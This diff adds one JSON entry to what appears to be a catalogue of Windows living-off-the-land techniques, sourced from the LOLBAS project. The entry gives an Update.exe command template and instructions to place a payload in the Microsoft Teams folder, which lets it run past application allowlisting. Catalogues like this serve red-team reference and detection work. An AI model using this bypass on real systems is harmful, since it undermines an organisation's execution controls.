@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-update-exe-awl-bypass-4",
+  "name": "LOLBAS · Update.exe (AWL Bypass) #4",
+  "command": "Update.exe --processStart {PATH:.exe} --process-start-args \"{CMD:args}\"",
+  "description": "Copy your payload into %userprofile%\\AppData\\Local\\Microsoft\\Teams\\current\\. Then run the command. Update.exe will execute the file you copied.",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "update",
+    "awl-bypass"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/Update/",
+  "upstream_id": "Update.exe/AWL Bypass/3",
+  "category": "lolbas",
+  "subcategory": "awl-bypass",
+  "references": [
+    {
+      "title": "LOLBAS — Update.exe",
+      "url": "https://lolbas-project.github.io/lolbas/Update/"
+    }
+  ]
+}
